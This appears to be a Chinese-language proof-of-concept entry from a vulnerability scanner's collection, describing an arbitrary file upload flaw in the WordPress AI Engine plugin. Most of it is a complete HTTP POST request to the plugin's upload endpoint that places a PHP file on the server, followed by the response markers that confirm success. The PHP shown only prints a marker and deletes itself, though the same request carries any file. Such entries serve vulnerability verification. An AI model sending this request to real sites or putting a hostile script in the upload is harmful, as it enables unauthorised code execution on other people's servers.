﻿# Wordpress AI Engine 插件 任意文件上传

> 更新时间：2024-05-07

> 漏洞编号：

> 漏洞说明：Wordpress saveconfiguration接口处存在任意文件上传漏洞，恶意攻击者可以上传恶意软件，例如后门、木马或勒索软件，以获取对服务器的远程访问权限或者破坏系统，对服务器造成极大的安全隐患。  

> 漏洞特征："wp-content/plugins/ai-engine/"

> 验证脚本：HTTP

```
POST /wp-json/mwai-ui/v1/files/upload HTTP/1.1
Accept: */*
Content-Disposition: form-data; filename="test.txt"
Content-Type: multipart/form-data; boundary=------------------------7bghbgerugy87gerbuy
Connection: close
 
--------------------------7bghbgerugy87gerbuy
Content-Disposition: form-data; name="file"; filename="dudesuite.php"
Content-Type: text/plain
 
<?php echo "DudeSuite";unlink(__FILE__); ?>
--------------------------7bghbgerugy87gerbuy--
```

> 响应代码特征：200

> 响应内容特征：dudesuite

> 上传文件定位：

> 验证文件来源：Wordpress AI Engine 插件 任意文件上传.poc

